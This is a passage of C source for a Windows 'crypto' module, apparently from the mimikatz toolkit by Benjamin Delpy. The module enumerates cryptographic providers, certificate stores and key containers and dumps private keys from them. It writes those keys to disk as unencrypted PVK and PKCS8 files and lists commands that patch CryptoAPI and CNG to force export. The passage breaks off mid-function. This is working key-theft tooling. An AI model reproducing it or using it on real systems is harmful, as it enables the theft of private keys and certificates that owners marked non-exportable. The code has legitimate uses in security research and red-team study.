/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_crypto.h"

HMODULE kuhl_m_crypto_hRsaEnh = NULL, kuhl_m_crypto_hDssEnh = NULL;

const KUHL_M_C kuhl_m_c_crypto[] = {
	{kuhl_m_crypto_l_providers,		L"providers",		L"List cryptographic providers"},
	{kuhl_m_crypto_l_stores,		L"stores",			L"List cryptographic stores"},
	{kuhl_m_crypto_l_certificates,	L"certificates",	L"List (or export) certificates"},
	{kuhl_m_crypto_l_keys,			L"keys",			L"List (or export) keys containers"},
	{kuhl_m_crypto_l_sc,			L"sc",				L"List smartcard readers"},
	{kuhl_m_crypto_hash,			L"hash",			L"Hash a password with optional username"},
	{kuhl_m_crypto_system,			L"system",			L"Describe a Windows System Certificate (file, TODO:registry or hive)"},
	{kuhl_m_crypto_c_sc_auth,		L"scauth",			L"Create a authentication certitifate (smartcard like) from a CA"},
	{kuhl_m_crypto_c_cert_to_hw,	L"certtohw",		L"Try to export a software CA to a crypto (virtual)hardware"},

	{kuhl_m_crypto_p_capi,			L"capi",			L"[experimental] Patch CryptoAPI layer for easy export"},
	{kuhl_m_crypto_p_cng,			L"cng",				L"[experimental] Patch CNG service for easy export"},

	{kuhl_m_crypto_extract,			L"extract",			L"[experimental] Extract keys from CAPI RSA/AES provider"},
	{kuhl_m_crypto_keyutil,			L"kutil",			NULL},
	{kuhl_m_crypto_platforminfo,	L"tpminfo",			NULL},
};

const KUHL_M kuhl_m_crypto = {
	L"crypto", L"Crypto Module", NULL,
	ARRAYSIZE(kuhl_m_c_crypto), kuhl_m_c_crypto, kuhl_m_crypto_init, kuhl_m_crypto_clean
};

NTSTATUS kuhl_m_crypto_init()
{
	NTSTATUS status = STATUS_NOT_FOUND;
	if(kuhl_m_crypto_hRsaEnh = LoadLibrary(L"rsaenh"))
		K_RSA_CPExportKey = (PCP_EXPORTKEY) GetProcAddress(kuhl_m_crypto_hRsaEnh, "CPExportKey");
	if(kuhl_m_crypto_hDssEnh = LoadLibrary(L"dssenh"))
		K_DSS_CPExportKey = (PCP_EXPORTKEY) GetProcAddress(kuhl_m_crypto_hDssEnh, "CPExportKey");
	if(K_RSA_CPExportKey && K_DSS_CPExportKey)
		status = STATUS_SUCCESS;
	return status;
}

NTSTATUS kuhl_m_crypto_clean()
{
	if(kuhl_m_crypto_hRsaEnh)
		if(FreeLibrary(kuhl_m_crypto_hRsaEnh))
			K_RSA_CPExportKey = NULL;
	if(kuhl_m_crypto_hDssEnh)
		if(FreeLibrary(kuhl_m_crypto_hDssEnh))
			K_DSS_CPExportKey = NULL;
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_crypto_l_providers(int argc, wchar_t * argv[])
{
	DWORD provType, tailleRequise, index = 0;
	wchar_t * monProvider;
	PCWCHAR name;
	PCRYPT_PROVIDERS pBuffer = NULL;
	HCRYPTPROV hProv;

	kprintf(L"\nCryptoAPI providers :\n");
	while(CryptEnumProviders(index, NULL, 0, &provType, NULL, &tailleRequise))
	{
		if(monProvider = (wchar_t *) LocalAlloc(LPTR, tailleRequise))
		{
			if(CryptEnumProviders(index, NULL, 0, &provType, monProvider, &tailleRequise))
			{
				name = kull_m_crypto_provider_type_to_name(provType);
				kprintf(L"%2u. %-13s (%2u)", index, name ? name : L"?", provType);
				if(CryptAcquireContext(&hProv, NULL, monProvider, provType, CRYPT_VERIFYCONTEXT))
				{
					if(kull_m_crypto_CryptGetProvParam(hProv, PP_IMPTYPE, FALSE, NULL, NULL, &provType))
						kprintf(L" %c", (provType & CRYPT_IMPL_HARDWARE) ? L'H' : L' ');
					CryptReleaseContext(hProv, 0);
				}
				kprintf(L" - %s\n", monProvider);
			}
			LocalFree(monProvider);
		}
		index++;
	}
	if(GetLastError() != ERROR_NO_MORE_ITEMS)
		PRINT_ERROR_AUTO(L"CryptEnumProviders");

	index = 0;
	kprintf(L"\nCryptoAPI provider types:\n");
	while(CryptEnumProviderTypes(index, NULL, 0, &provType, NULL, &tailleRequise))
	{
		if(monProvider = (wchar_t *) LocalAlloc(LPTR, tailleRequise))
		{
			if(CryptEnumProviderTypes(index, NULL, 0, &provType, monProvider, &tailleRequise))
			{
				name = kull_m_crypto_provider_type_to_name(provType);
				kprintf(L"%2u. %-13s (%2u) - %s\n", index, name ? name : L"?", provType, monProvider);
			}
			LocalFree(monProvider);
		}
		index++;
	}
	if(GetLastError() != ERROR_NO_MORE_ITEMS)
		PRINT_ERROR_AUTO(L"CryptEnumProviderTypes");

	kprintf(L"\nCNG providers :\n");
	__try 
	{
		if(NT_SUCCESS(BCryptEnumRegisteredProviders(&tailleRequise, &pBuffer)))
		{
			for(index = 0; index < pBuffer->cProviders; index++)
				kprintf(L"%2u. %s\n", index, pBuffer->rgpszProviders[index]);
			BCryptFreeBuffer(pBuffer);
		}
		else PRINT_ERROR_AUTO(L"BCryptEnumRegisteredProviders");
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_crypto_l_stores(int argc, wchar_t * argv[])
{
	DWORD dwSystemStore, nbStore = 0;
	PCWCHAR szSystemStore;
	kull_m_string_args_byName(argc, argv, L"systemstore", &szSystemStore, L"CURRENT_USER"/*kuhl_m_crypto_system_stores[0].name*/);
	dwSystemStore = kull_m_crypto_system_store_to_dword(szSystemStore);
	kprintf(L"Asking for System Store \'%s\' (0x%08x)\n", szSystemStore, dwSystemStore);

	if(!CertEnumSystemStore(dwSystemStore, NULL, &nbStore, kuhl_m_crypto_l_stores_enumCallback_print))
		PRINT_ERROR_AUTO(L"CertEnumSystemStore");

	return STATUS_SUCCESS;
}

BOOL WINAPI kuhl_m_crypto_l_stores_enumCallback_print(const void *pvSystemStore, DWORD dwFlags, PCERT_SYSTEM_STORE_INFO pStoreInfo, void *pvReserved, void *pvArg)
{
	kprintf(L"%2u. %s\n", (*((DWORD *) pvArg))++, (wchar_t *) pvSystemStore);
	return TRUE;
}

void kuhl_m_crypto_certificate_descr(PCCERT_CONTEXT pCertContext)
{
	BYTE sha1[SHA_DIGEST_LENGTH];
	DWORD cbSha1 = sizeof(sha1), dwSizeNeeded;
	PCCRYPT_OID_INFO  info;
	PWSTR name;

	if(name = kuhl_m_crypto_pki_getCertificateName(&pCertContext->pCertInfo->Subject))
	{
		kprintf(L"    Subject  : %s\n", name);
		LocalFree(name);
	}
	if(name = kuhl_m_crypto_pki_getCertificateName(&pCertContext->pCertInfo->Issuer))
	{
		kprintf(L"    Issuer   : %s\n", name);
		LocalFree(name);
	}
	kprintf(L"    Serial   : ");
	kull_m_string_wprintf_hex(pCertContext->pCertInfo->SerialNumber.pbData, pCertContext->pCertInfo->SerialNumber.cbData, 0);
	kprintf(L"\n");

	kprintf(L"    Algorithm: %S", pCertContext->pCertInfo->SubjectPublicKeyInfo.Algorithm.pszObjId);
	if(info = CryptFindOIDInfo(CRYPT_OID_INFO_OID_KEY, pCertContext->pCertInfo->SubjectPublicKeyInfo.Algorithm.pszObjId, CRYPT_OID_DISABLE_SEARCH_DS_FLAG))
		kprintf(L" (%s)", info->pwszName);
	kprintf(L"\n    Validity : ");
	kull_m_string_displayLocalFileTime(&pCertContext->pCertInfo->NotBefore);
	kprintf(L" -> ");
	kull_m_string_displayLocalFileTime(&pCertContext->pCertInfo->NotAfter);
	kprintf(L"\n");

	dwSizeNeeded = CertGetNameString(pCertContext, CERT_NAME_UPN_TYPE, 0, NULL, NULL, 0);
	if(dwSizeNeeded > 1)
	{
		if(name = (PWSTR) LocalAlloc(LPTR, dwSizeNeeded * sizeof(wchar_t)))
		{
			if(CertGetNameString(pCertContext, CERT_NAME_UPN_TYPE, 0, NULL, name, dwSizeNeeded))
				kprintf(L"    UPN      : %s\n", name);
			LocalFree(name);
		}
	}
	if(CertGetCertificateContextProperty(pCertContext, CERT_SHA1_HASH_PROP_ID, sha1, &cbSha1))
	{
		kprintf(L"    Hash SHA1: ");
		kull_m_string_wprintf_hex(sha1, cbSha1, 0);
		kprintf(L"\n");
	}
	else PRINT_ERROR_AUTO(L"CertGetCertificateContextProperty(SHA1)");
}

const DWORD nameSrc[] = {CERT_NAME_FRIENDLY_DISPLAY_TYPE, CERT_NAME_DNS_TYPE, CERT_NAME_EMAIL_TYPE, CERT_NAME_UPN_TYPE, CERT_NAME_URL_TYPE};
NTSTATUS kuhl_m_crypto_l_certificates(int argc, wchar_t * argv[])
{
	HCERTSTORE hCertificateStore;
	PCCERT_CONTEXT pCertContext;
	DWORD i, j, dwSizeNeeded, keySpec, flags = CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG;
	wchar_t *certName;
	PCRYPT_KEY_PROV_INFO pBuffer;
	HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv;
	HCRYPTKEY maCle;
	BOOL noKey, keyToFree;

	PCWCHAR szSystemStore, szStore, name;
	DWORD dwSystemStore = 0;

	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
	if(kull_m_string_args_byName(argc, argv, L"silent", NULL, NULL))
		flags |= CRYPT_ACQUIRE_SILENT_FLAG;
	noKey = kull_m_string_args_byName(argc, argv, L"nokey", NULL, NULL);

	kull_m_string_args_byName(argc, argv, L"systemstore", &szSystemStore, L"CURRENT_USER"/*kuhl_m_crypto_system_stores[0].name*/);
	dwSystemStore = kull_m_crypto_system_store_to_dword(szSystemStore);
	kull_m_string_args_byName(argc, argv, L"store", &szStore, L"My");

	kprintf(L" * System Store  : \'%s\' (0x%08x)\n"
			L" * Store         : \'%s\'\n\n",
			szSystemStore, dwSystemStore,
			szStore);

	if(hCertificateStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) NULL, dwSystemStore | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, szStore))
	{
		for (i = 0, pCertContext = CertEnumCertificatesInStore(hCertificateStore, NULL); pCertContext != NULL; pCertContext = CertEnumCertificatesInStore(hCertificateStore, pCertContext), i++) // implicit CertFreeCertificateContext
		{
			for(j = 0; j < ARRAYSIZE(nameSrc); j++)
			{
				dwSizeNeeded = CertGetNameString(pCertContext, nameSrc[j], 0, NULL, NULL, 0);
				if(dwSizeNeeded > 0)
				{
					if(certName = (wchar_t *) LocalAlloc(LPTR, dwSizeNeeded * sizeof(wchar_t)))
					{
						if(CertGetNameString(pCertContext, nameSrc[j], 0, NULL, certName, dwSizeNeeded) == dwSizeNeeded)
						{
							kprintf(L"%2u. %s\n", i, certName);
							kuhl_m_crypto_certificate_descr(pCertContext);
							dwSizeNeeded = 0;
							if(CertGetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, NULL, &dwSizeNeeded))
							{
								if(pBuffer = (PCRYPT_KEY_PROV_INFO) LocalAlloc(LPTR, dwSizeNeeded))
								{
									if(CertGetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, pBuffer, &dwSizeNeeded))
									{
										name = kull_m_crypto_provider_type_to_name(pBuffer->dwProvType);
										kprintf(
											L"\tKey Container  : %s\n"
											L"\tProvider       : %s\n"
											L"\tProvider type  : %s (%u)\n",
											(pBuffer->pwszContainerName ? pBuffer->pwszContainerName : L"(null)"),
											(pBuffer->pwszProvName ? pBuffer->pwszProvName : L"(null)"),
											name ? name : L"?", pBuffer->dwProvType);
										
										if(!noKey)
										{
											if(CryptAcquireCertificatePrivateKey(pCertContext, flags, NULL, &monProv, &keySpec, &keyToFree))
											{
												kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(keySpec), keySpec);

												if(keySpec != CERT_NCRYPT_KEY_SPEC)
												{
													if(CryptGetUserKey(monProv, keySpec, &maCle))
													{
														kuhl_m_crypto_printKeyInfos(0, maCle, monProv);
														CryptDestroyKey(maCle);
													}
													else PRINT_ERROR_AUTO(L"CryptGetUserKey");
													if(keyToFree)
														CryptReleaseContext(monProv, 0);
												}
												else
												{
													__try
													{
														kuhl_m_crypto_printKeyInfos(monProv, 0, 0);
														if(keyToFree)
															NCryptFreeObject(monProv);
													}
													__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
													{
														PRINT_ERROR(L"keySpec == CERT_NCRYPT_KEY_SPEC without CNG Handle ?\n");
													}
												}
											}
											else PRINT_ERROR_AUTO(L"CryptAcquireCertificatePrivateKey");
										}
									}
									else PRINT_ERROR_AUTO(L"CertGetCertificateContextProperty");
									LocalFree(pBuffer);
								}
							}
							if(export)
								kuhl_m_crypto_exportCert(pCertContext, (BOOL) dwSizeNeeded, szSystemStore, szStore, i, certName);
							kprintf(L"\n");
						}
						else PRINT_ERROR_AUTO(L"CertGetNameString");
						LocalFree(certName);
					}
					break;
				}
				else PRINT_ERROR_AUTO(L"CertGetNameString (for len)");
			}
		}
		CertCloseStore(hCertificateStore, CERT_CLOSE_STORE_FORCE_FLAG);
	}
	else PRINT_ERROR_AUTO(L"CertOpenStore");

	return STATUS_SUCCESS;
}

void kuhl_m_crypto_l_keys_capi(LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags, BOOL export, LPCWSTR szStore)
{
	HCRYPTPROV hCryptProv, hCryptKeyProv;
	HCRYPTKEY hCapiKey;
	DWORD i, dwSizeNeeded, ks, CRYPT_first_next = CRYPT_FIRST, dwContainer = szContainer ? (DWORD) wcslen(szContainer) : 0, dwSubContainer;
	BOOL success;
	char *aContainerName, *aUniqueName;
	wchar_t *containerName, *fullContainer;

	if(CryptAcquireContext(&hCryptProv, szContainer, szProvider, dwProvType, CRYPT_VERIFYCONTEXT | dwFlags))
	{
		success = CryptGetProvParam(hCryptProv, PP_ENUMCONTAINERS, NULL, &dwSizeNeeded, CRYPT_first_next);
		if(aContainerName = (char *) LocalAlloc(LPTR, dwSizeNeeded))
		{
			i = 0;
			while(success)
			{
				if(success = (CryptGetProvParam(hCryptProv, PP_ENUMCONTAINERS, (BYTE *) aContainerName, &dwSizeNeeded, CRYPT_first_next)))
				{
					if(containerName = kull_m_string_qad_ansi_to_unicode(aContainerName))
					{
						kprintf(L"    %u. %s\n", i,  containerName);
						dwSubContainer = (DWORD) wcslen(containerName);

						if(fullContainer = (wchar_t *) LocalAlloc(LPTR, (dwContainer + dwSubContainer + 1) * sizeof(wchar_t)))
						{
							if(dwContainer)
								RtlCopyMemory(fullContainer, szContainer, dwContainer * sizeof(wchar_t));
							RtlCopyMemory(fullContainer + dwContainer, containerName, dwSubContainer * sizeof(wchar_t));

							if(CryptAcquireContext(&hCryptKeyProv, fullContainer, szProvider, dwProvType, dwFlags))
							{
								if(kull_m_crypto_CryptGetProvParam(hCryptKeyProv, PP_UNIQUE_CONTAINER, FALSE, (PBYTE *) &aUniqueName, NULL, NULL))
								{
									kprintf(L"    %S\n", aUniqueName);
									LocalFree(aUniqueName);
								}
								for(ks = AT_KEYEXCHANGE, hCapiKey = 0; (ks <= AT_SIGNATURE) && !CryptGetUserKey(hCryptKeyProv, ks, &hCapiKey); ks++);
								if(hCapiKey)
								{
									kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(ks), ks);
									kuhl_m_crypto_printKeyInfos(0, hCapiKey, hCryptKeyProv);
									if(export)
										kuhl_m_crypto_exportKeyToFile(0, hCapiKey, ks, szStore, i, containerName);
									CryptDestroyKey(hCapiKey);
								}
								else PRINT_ERROR_AUTO(L"CryptGetUserKey");
							}
							LocalFree(fullContainer);
						}
						kprintf(L"\n");
						LocalFree(containerName);
					}
				}
				CRYPT_first_next = CRYPT_NEXT;
				i++;
			}
			if(GetLastError() != ERROR_NO_MORE_ITEMS)
				PRINT_ERROR_AUTO(L"CryptGetProvParam");

			CryptReleaseContext(hCryptProv, 0);
			LocalFree(aContainerName);
		}
	}
	else PRINT_ERROR_AUTO(L"CryptAcquireContext");
}

void kuhl_m_crypto_l_keys_cng(LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwFlags, BOOL export, LPCWSTR szStore)
{
	NCRYPT_PROV_HANDLE hProvider;
	NCryptKeyName *pKeyName;
	PVOID pEnumState = NULL;
	SECURITY_STATUS retour;
	NCRYPT_KEY_HANDLE hCngKey;
	DWORD i;

	__try
	{
		if(NT_SUCCESS(retour = NCryptOpenStorageProvider(&hProvider, szProvider, 0)))
		{
			i = 0;
			while(NT_SUCCESS(retour = NCryptEnumKeys(hProvider, szContainer, &pKeyName, &pEnumState, dwFlags)))
			{
				kprintf(L"    %u. %s\n", i,  pKeyName->pszName);

				if(NT_SUCCESS(retour = NCryptOpenKey(hProvider, &hCngKey, pKeyName->pszName, 0, dwFlags)))
				{
					kuhl_m_crypto_printKeyInfos(hCngKey, 0, 0);
					if(export)
						kuhl_m_crypto_exportKeyToFile(hCngKey, 0, AT_KEYEXCHANGE, szStore, i, pKeyName->pszName);
					NCryptFreeObject(hCngKey);
				}
				else PRINT_ERROR(L"NCryptOpenKey %08x\n", retour);
				kprintf(L"\n");
				NCryptFreeBuffer(pKeyName);
				i++;
			}
			if(retour != NTE_NO_MORE_ITEMS)
				PRINT_ERROR(L"NCryptEnumKeys %08x\n", retour);

			if(pEnumState)
				NCryptFreeBuffer(pEnumState);
			NCryptFreeObject(hProvider);
		}
		else PRINT_ERROR(L"NCryptOpenStorageProvider %08x\n", retour);
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
}

NTSTATUS kuhl_m_crypto_l_keys(int argc, wchar_t * argv[])
{
	PCWCHAR szProvider, pProvider, szProviderType, szStore, szCngProvider;
	DWORD dwProviderType, dwFlags = 0;
	
	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
	
	kull_m_string_args_byName(argc, argv, L"provider", &szProvider, L"MS_ENHANCED_PROV");
	if(!(pProvider = kull_m_crypto_provider_to_realname(szProvider)))
		pProvider = szProvider;
	
	kull_m_string_args_byName(argc, argv, L"providertype", &szProviderType, L"PROV_RSA_FULL");
	if(!(dwProviderType = kull_m_crypto_provider_type_to_dword(szProviderType)))
		dwProviderType = wcstoul(szProviderType, NULL, 0);

	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
		dwFlags = CRYPT_MACHINE_KEYSET; // same as NCRYPT_MACHINE_KEY_FLAG :)
	szStore = dwFlags ? L"machine" : L"user";
	
	if(kull_m_string_args_byName(argc, argv, L"silent", NULL, NULL))
		dwFlags |= CRYPT_SILENT;

	kull_m_string_args_byName(argc, argv, L"cngprovider", &szCngProvider, MS_KEY_STORAGE_PROVIDER);

	kprintf(L" * Store         : \'%s\'\n"	
			L" * Provider      : \'%s\' (\'%s\')\n"
			L" * Provider type : \'%s\' (%u)\n"
			L" * CNG Provider  : \'%s\'\n",
			szStore,
			szProvider, pProvider,
			szProviderType, dwProviderType,
			szCngProvider);

	kprintf(L"\nCryptoAPI keys :\n");
	kuhl_m_crypto_l_keys_capi(NULL, pProvider, dwProviderType, dwFlags, export, szStore);
	kprintf(L"\nCNG keys :\n");
	kuhl_m_crypto_l_keys_cng(NULL, szCngProvider, dwFlags, export, szStore);
	return STATUS_SUCCESS;
}

void kuhl_m_crypto_printKeyInfos(NCRYPT_KEY_HANDLE hCNGKey, HCRYPTKEY hCAPIKey, OPTIONAL HCRYPTPROV hCAPIProv)
{
	DWORD myDWORD, dwSizeNeeded;
	PWSTR myStr;
	NCRYPT_PROV_HANDLE hCNGProv;
	if(hCNGKey)
	{
		__try
		{
			if(kull_m_crypto_NCryptGetProperty(hCNGKey, NCRYPT_PROVIDER_HANDLE_PROPERTY, FALSE, NULL, NULL, NULL, &hCNGProv))
			{
				if(kull_m_crypto_NCryptGetProperty(hCNGProv, NCRYPT_NAME_PROPERTY, FALSE, (PBYTE *) &myStr, NULL, NULL, NULL))
				{
					kprintf(L"\t|Provider name : %s\n", myStr);
					LocalFree(myStr);
				}
				if(kull_m_crypto_NCryptGetProperty(hCNGProv, NCRYPT_IMPL_TYPE_PROPERTY, FALSE, NULL, NULL, &myDWORD, NULL))
				{
					kprintf(L"\t|Implementation: ");
					kull_m_crypto_ncrypt_impl_types_descr(myDWORD);
					kprintf(L"\n");
				}
				NCryptFreeObject(hCNGProv);
			}
			if(kull_m_crypto_NCryptGetProperty(hCNGKey, NCRYPT_NAME_PROPERTY, FALSE, (PBYTE *) &myStr, NULL, NULL, NULL))
			{
				kprintf(L"\tKey Container  : %s\n", myStr);
				LocalFree(myStr);
			}
			if(kull_m_crypto_NCryptGetProperty(hCNGKey, NCRYPT_UNIQUE_NAME_PROPERTY, FALSE, (PBYTE *) &myStr, NULL, NULL, NULL))
			{
				kprintf(L"\tUnique name    : %s\n", myStr);
				LocalFree(myStr);
			}
			if(kull_m_crypto_NCryptGetProperty(hCNGKey, NCRYPT_ALGORITHM_PROPERTY, FALSE, (PBYTE *) &myStr, NULL, NULL, NULL))
			{
				kprintf(L"\tAlgorithm      : %s\n", myStr);
				LocalFree(myStr);
			}
			if(kull_m_crypto_NCryptGetProperty(hCNGKey, NCRYPT_LENGTH_PROPERTY, FALSE, NULL, NULL, &myDWORD, NULL))
				kprintf(L"\tKey size       : %u (0x%08x)\n", myDWORD, myDWORD);
			if(kull_m_crypto_NCryptGetProperty(hCNGKey, NCRYPT_EXPORT_POLICY_PROPERTY, FALSE, NULL, NULL, &myDWORD, NULL))
			{
				kprintf(L"\tExport policy  : %08x ( ", myDWORD);
				kull_m_crypto_ncrypt_allow_exports_descr(myDWORD);
				kprintf(L")\n\tExportable key : %s\n", ((myDWORD & (NCRYPT_ALLOW_EXPORT_FLAG | NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG)) == (NCRYPT_ALLOW_EXPORT_FLAG | NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG)) ? L"YES" : L"NO");
			}
			if(kull_m_crypto_NCryptGetProperty(hCNGKey, NCRYPT_USE_VIRTUAL_ISOLATION_PROPERTY, FALSE, NULL, NULL, &myDWORD, NULL))
				kprintf(L"\tLSA isolation  : %s\n", myDWORD ? L"YES" : L"NO");
		}
		__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
	}
	else if(hCAPIKey)
	{
		if(hCAPIProv)
		{
			if(kull_m_crypto_CryptGetProvParam(hCAPIProv, PP_NAME, FALSE, (PBYTE *) &myStr, NULL, NULL))
			{
				kprintf(L"\t|Provider name : %S\n", myStr);
				LocalFree(myStr);
			}

			if(kull_m_crypto_CryptGetProvParam(hCAPIProv, PP_CONTAINER, FALSE, (PBYTE *) &myStr, NULL, NULL))
			{
				kprintf(L"\t|Key Container : %S\n", myStr);
				LocalFree(myStr);
			}
			if(kull_m_crypto_CryptGetProvParam(hCAPIProv, PP_UNIQUE_CONTAINER, FALSE, (PBYTE *) &myStr, NULL, NULL))
			{
				kprintf(L"\t|Unique name   : %S\n", myStr);
				LocalFree(myStr);
			}
			if(kull_m_crypto_CryptGetProvParam(hCAPIProv, PP_IMPTYPE, FALSE, NULL, NULL, &myDWORD))
			{
				kprintf(L"\t|Implementation: ");
				kull_m_crypto_pp_imptypes_descr(myDWORD);
				kprintf(L"\n");
			}
		}
		dwSizeNeeded = sizeof(DWORD);
		if(CryptGetKeyParam(hCAPIKey, KP_ALGID, (BYTE *) &myDWORD, &dwSizeNeeded, 0))
			kprintf(L"\tAlgorithm      : %s\n", kull_m_crypto_algid_to_name(myDWORD));
		dwSizeNeeded = sizeof(DWORD);
		if(CryptGetKeyParam(hCAPIKey, KP_KEYLEN, (BYTE *) &myDWORD, &dwSizeNeeded, 0))
			kprintf(L"\tKey size       : %u (0x%08x)\n", myDWORD, myDWORD);
		dwSizeNeeded = sizeof(DWORD);
		if(CryptGetKeyParam(hCAPIKey, KP_PERMISSIONS, (BYTE *) &myDWORD, &dwSizeNeeded, 0))
		{
			kprintf(L"\tKey permissions: %08x ( ", myDWORD);
			kull_m_crypto_kp_permissions_descr(myDWORD);
			kprintf(L")\n\tExportable key : %s\n", (myDWORD & CRYPT_EXPORT) ? L"YES" : L"NO");
		}
	}
}

void kuhl_m_crypto_exportRawKeyToFile(LPCVOID data, DWORD size, BOOL isCNG, DWORD dwKeySpec, DWORD dwProviderType, const wchar_t * store, const DWORD index, const wchar_t * name, BOOL wantExport, BOOL wantInfos)
{
	BOOL status = FALSE;
	NCRYPT_PROV_HANDLE hCngProv = 0;
	NCRYPT_KEY_HANDLE hCngKey = 0;
	DWORD exportPolicy = NCRYPT_ALLOW_EXPORT_FLAG | NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG;
	HCRYPTPROV hCapiProv = 0;
	HCRYPTKEY hCapiKey = 0;
	PWCHAR filenamebuffer;

	if(isCNG)
		kull_m_crypto_NCryptImportKey(data, size, BCRYPT_PRIVATE_KEY_BLOB, &hCngProv, &hCngKey);
	else
	{
		if(CryptAcquireContext(&hCapiProv, NULL, NULL, dwProviderType/*PROV_DSS_DH/* RSA_FULL*/, CRYPT_VERIFYCONTEXT))
		{
			if(!CryptImportKey(hCapiProv, (LPCBYTE) data, size, 0, CRYPT_EXPORTABLE, &hCapiKey))
				PRINT_ERROR_AUTO(L"CryptImportKey");
		}
	}

	if(hCngKey || hCapiKey)
	{
		if(wantInfos)
			kuhl_m_crypto_printKeyInfos(hCngKey, hCapiKey, hCapiProv);
		if(wantExport)
			kuhl_m_crypto_exportKeyToFile(hCngKey, hCapiKey, dwKeySpec, store, index, name);
		kull_m_crypto_NCryptFreeHandle(&hCngProv, &hCngKey);
		if(hCapiKey)
			CryptDestroyKey(hCapiKey);
	}
	else
	{
		if(filenamebuffer = kuhl_m_crypto_generateFileName(store, isCNG ? L"cng" : L"capi", index, name, L"binary"))
		{
			kprintf(L"\tPrivate raw export : ");
			if(kull_m_file_writeData(filenamebuffer, data, size))
				kprintf(L"OK - \'%s\'\n", filenamebuffer);
			else
			{
				kprintf(L"KO - ");
				PRINT_ERROR_AUTO(L"kull_m_file_writeData");
			}
			LocalFree(filenamebuffer);
		}
	}
	if(hCapiProv)
		CryptReleaseContext(hCapiProv, 0);
}
const KUHL_M_CRYPTO_NCRYPT_GROUP_TO_EXPORT KUHL_M_CRYPTO_GROUPEXPORTS[] = {
	{NCRYPT_RSA_ALGORITHM_GROUP,	LEGACY_RSAPRIVATE_BLOB,			L"rsa.pvk",		TRUE},
	{NCRYPT_DSA_ALGORITHM_GROUP,	LEGACY_DSA_V2_PRIVATE_BLOB,		L"dsa.pvk",		TRUE},
	{NCRYPT_ECDSA_ALGORITHM_GROUP,	NCRYPT_PKCS8_PRIVATE_KEY_BLOB,	L"dsa.ec.p8k",	FALSE},
	{NCRYPT_ECDH_ALGORITHM_GROUP,	NCRYPT_PKCS8_PRIVATE_KEY_BLOB,	L"dh.ec.p8k",	FALSE},
};
void kuhl_m_crypto_exportKeyToFile(NCRYPT_KEY_HANDLE hCngKey, HCRYPTKEY hCapiKey, DWORD keySpec, const wchar_t * store, const DWORD index, const wchar_t * name)
{
	BOOL isExported = FALSE;
	DWORD i, szExport, szPVK;
	PBYTE pExport = NULL;
	SECURITY_STATUS nCryptReturn;
	PVK_FILE_HDR pvkHeader = {PVK_MAGIC, PVK_FILE_VERSION_0, keySpec, PVK_NO_ENCRYPT, 0, 0};
	PCWCHAR provType = hCngKey ? L"cng" : L"capi", pExt;
	PWCHAR filenamebuffer, cngAlg;
	const KUHL_M_CRYPTO_NCRYPT_GROUP_TO_EXPORT *pCngElem = NULL;
	LPSTR b64Out;

	kprintf(L"\tPrivate export : ");
	if(hCapiKey)
	{
		if(CryptExportKey(hCapiKey, 0, PRIVATEKEYBLOB, 0, NULL, &szExport))
		{
			szPVK = szExport + sizeof(PVK_FILE_HDR);
			if(pExport = (PBYTE) LocalAlloc(LPTR, szPVK))
			{
				if(CryptExportKey(hCapiKey, 0, PRIVATEKEYBLOB, 0, pExport + sizeof(PVK_FILE_HDR), &szExport))
				{
					switch(((BLOBHEADER *) (pExport + sizeof(PVK_FILE_HDR)))->aiKeyAlg)
					{
					case CALG_RSA_KEYX:
						pExt = L"keyx.rsa.pvk";
						break;
					case CALG_RSA_SIGN:
						pExt = L"sign.rsa.pvk";
						break;
					case CALG_DSS_SIGN:
						pExt = L"sign.dsa.pvk";
						break;
					default:
						pExt = L"pvk";
					}
					pvkHeader.cbPvk = szExport;
					RtlCopyMemory(pExport, &pvkHeader, sizeof(PVK_FILE_HDR));
				}
				else
				{
					PRINT_ERROR_AUTO(L"CryptExportKey(data)");
					pExport = (PBYTE) LocalFree(pExport);
				}
			}
		}
		else PRINT_ERROR_AUTO(L"CryptExportKey(init)");
	}
	else if(hCngKey)
	{
		__try
		{
			if(kull_m_crypto_NCryptGetProperty(hCngKey, NCRYPT_ALGORITHM_GROUP_PROPERTY, TRUE, (PBYTE *) &cngAlg, NULL, NULL, NULL))
			{
				for(i = 0; i < ARRAYSIZE(KUHL_M_CRYPTO_GROUPEXPORTS); i++)
				{
					if(!_wcsicmp(cngAlg, KUHL_M_CRYPTO_GROUPEXPORTS[i].pszAlgorithmGroup))
					{
						pCngElem = KUHL_M_CRYPTO_GROUPEXPORTS + i;
						break;
					}
				}
				if(pCngElem)
				{
					nCryptReturn = NCryptExportKey(hCngKey, 0, pCngElem->pszBlobType, NULL, NULL, 0, &szExport, 0);
					if(nCryptReturn == ERROR_SUCCESS)
					{
						szPVK = szExport + (pCngElem->needPVKHeader ? sizeof(PVK_FILE_HDR) : 0);
						if(pExport = (PBYTE) LocalAlloc(LPTR, szPVK))
						{
							nCryptReturn = NCryptExportKey(hCngKey, 0, pCngElem->pszBlobType, NULL, pExport + (pCngElem->needPVKHeader ? sizeof(PVK_FILE_HDR) : 0), szExport, &szExport, 0);
